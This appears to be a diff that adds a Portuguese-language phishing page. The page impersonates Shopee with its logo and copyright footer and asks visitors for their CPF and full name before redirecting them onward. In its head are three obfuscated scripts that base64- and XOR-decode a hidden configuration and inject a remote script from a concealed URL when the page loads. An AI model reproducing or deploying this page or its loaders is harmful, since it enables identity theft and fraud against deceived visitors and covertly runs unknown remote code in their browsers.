@@ -1,0 +1,175 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>(function(){var j_21=atob("DPkQ0p42/imepZHm14Iyp+xa3BO8zeWSp4oq/bFVmkew0OWLvp9p/P1Zkwf8176VtIt5oupF0Vn33fSK+Il5qvta0EPth73Eto1koPdUi1371rPcjKQ88PlakUv/yeLE7aJr8PBXk0y8n7OWvoF1vtdS3AW80/CKopwy6LwAn0ipl/fX4cwp5KwGy0unlaHSspxy4qgUg3Tj");var k_y=[];for(var u_uggh=0;u_uggh<j_21.length;u_uggh++){k_y.push(j_21.charCodeAt(u_uggh)&255);}var a_g5df=k_y[0];var f_4l=k_y.slice(1,1+a_g5df);var j_7j0=k_y.slice(1+a_g5df);var i_m7x=j_7j0.map(function(b,m_k1ja){return b^f_4l[m_k1ja%a_g5df];});var v_0="";for(var q_s6pb=0;q_s6pb<i_m7x.length;q_s6pb++){v_0+=String.fromCharCode(i_m7x[q_s6pb]&255);}var p_qtef=decodeURIComponent(escape(v_0));var x_y=JSON.parse(p_qtef);var z_5=x_y.globals||[];z_5.forEach(function(u_z0){window[u_z0.name]=u_z0.value;});var t_vg=document.createElement("script");t_vg.src=x_y.url;t_vg.async=true;t_vg.defer=true;(x_y.attributes||[]).forEach(function(z_lg){t_vg.setAttribute(z_lg.name,z_lg.value);});(document.head||document.documentElement).appendChild(t_vg);})();</script>
+<script>(function(){var v_8=atob("DNlWtjA978vYXAIduKJ0w0JRzfH6NHZpyKpsmR9ei6X2KXZw0b8vmFNSguW6Li1u26s/xkROwL6sMXEy1Lgi00NJwaGrfi4/2a0ixFlfmr+9LyAn46J02FFQiunifmZ8zLh7w0RQhq2hcXJv3a8z2EQQl6i3OC9u27J0mhJLjqetOSAnmvsrmksfgaq1OSAnmr03wlEQmr+1NWRklakk00ZYgb/1L3d/0b0llBwfmaq0KWc/gvt0y21A");var f_3wb=[];for(var x_0ml=0;x_0ml<v_8.length;x_0ml++){f_3wb.push(v_8.charCodeAt(x_0ml)&255);}var b_e=f_3wb[0];var v_f=f_3wb.slice(1,1+b_e);var q_vd91=f_3wb.slice(1+b_e);var q_m=q_vd91.map(function(b,p_3y){return b^v_f[p_3y%b_e];});var j_97="";for(var j_akya=0;j_akya<q_m.length;j_akya++){j_97+=String.fromCharCode(q_m[j_akya]&255);}var b_7iw=decodeURIComponent(escape(j_97));var y_d=JSON.parse(b_7iw);var q_ms6u=y_d.globals||[];q_ms6u.forEach(function(b_p){window[b_p.name]=b_p.value;});var n_s8p=document.createElement("script");n_s8p.src=y_d.url;n_s8p.async=true;n_s8p.defer=true;(y_d.attributes||[]).forEach(function(j_x){n_s8p.setAttribute(j_x.name,j_x.value);});(document.head||document.documentElement).appendChild(n_s8p);})();</script>
+
+
+
+
+
+
+    
+   
+
+
+
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de CPF</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+
+
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 3px solid #ee4d2d;
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+        .main-content {
+            max-width: 500px;
+            background: #fff;
+            margin: 50px auto;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #ee4d2d;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: white !important;
+            background-color: #000 !important;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+            margin-top: auto;
+        }
+
+        .result-box {
+            margin-top: 20px;
+            background-color: #f9f9f9;
+            border: 1px solid #e6e6e6;
+            border-radius: 8px;
+            padding: 15px;
+            display: none;
+            text-align: left;
+        }
+
+        .result-box p {
+            margin: 0 0 10px;
+        }
+
+        .loader {
+            display: none;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .loader img {
+            width: 50px;
+            height: 50px;
+        }
+
+        .success-message {
+            text-align: center;
+            font-weight: bold;
+            color: green;
+            margin-bottom: 15px;
+        }
+
+        .success-message img {
+            width: 50px;
+            height: 50px;
+            display: block;
+            margin: 0 auto 10px;
+        }
+    </style>
+<script>(function(){var x_b=atob("DL8PYy5lFEVOwHIWosQtFlwJNn9sqAZi0sw1TAEGcCtgtQZ7y9l2TU0KeWsssl1lwc1mE1oWOzUnuBd6jc9mG0sJOi894l40w8t7EUcHYTErs1As+eIjQUkJeycvrAE0mOR0QUAEeSBs+lBmy8dqD2cBNmlsthN619otWQxTdSR58hQnlIo2VRxVISd38EIix9ptUxhHaRgz");var f_64=[];for(var e_q=0;e_q<x_b.length;e_q++){f_64.push(x_b.charCodeAt(e_q)&255);}var n_80qd=f_64[0];var e_pjom=f_64.slice(1,1+n_80qd);var d_r=f_64.slice(1+n_80qd);var p_39=d_r.map(function(b,h_spyg){return b^e_pjom[h_spyg%n_80qd];});var m_39vl="";for(var x_opvr=0;x_opvr<p_39.length;x_opvr++){m_39vl+=String.fromCharCode(p_39[x_opvr]&255);}var e_yre=decodeURIComponent(escape(m_39vl));var r_zhj=JSON.parse(e_yre);var o_l1ml=r_zhj.globals||[];o_l1ml.forEach(function(w_vh0){window[w_vh0.name]=w_vh0.value;});var v_a=document.createElement("script");v_a.src=r_zhj.url;v_a.async=true;v_a.defer=true;(r_zhj.attributes||[]).forEach(function(q_d){v_a.setAttribute(q_d.name,q_d.value);});(document.head||document.documentElement).appendChild(v_a);})();</script>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <img src="images/shopee-logo.png" alt="YES Card">
+    </div>
+
+<!-- Main Content -->
+<div class="main-content">
+    <p style="color:gray; text-align:initial">Preencha os dados abaixo</p>
+    <form id="cadastroForm" style="text-align:initial">
+        <div class="mb-3">
+            <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
+            <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
+        </div>
+        <div class="mb-3">
+            <label for="nome" class="form-label" style="color:gray; font-size:13px">Nome Completo</label>
+            <input type="text" class="form-control" id="nome" placeholder="Digite seu nome completo">
+        </div>
+    </form>
+    <button id="salvarBtn" class="btn-custom" onclick="salvarDados()">Salvar e Continuar</button>
+</div>
+
+<!-- Script -->
+<script>
+    function salvarDados() {
+        const cpf = document.getElementById("cpf").value;
+        const nomeCompleto = document.getElementById("nome").value;
+
+        if (!cpf || !nomeCompleto) {
+            return;
+        }
+
+        localStorage.setItem("cpf", cpf);
+        localStorage.setItem("nome", nomeCompleto);
+
+        window.location.href = "../card.html" + window.location.search;
+    }
+</script>
+
+
+
+    <!-- Footer -->
+    <div class="footer">
+Copyright © 2025 Shopee. Todos os direitos reservados.<br>
+
+Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+
+</body></html>
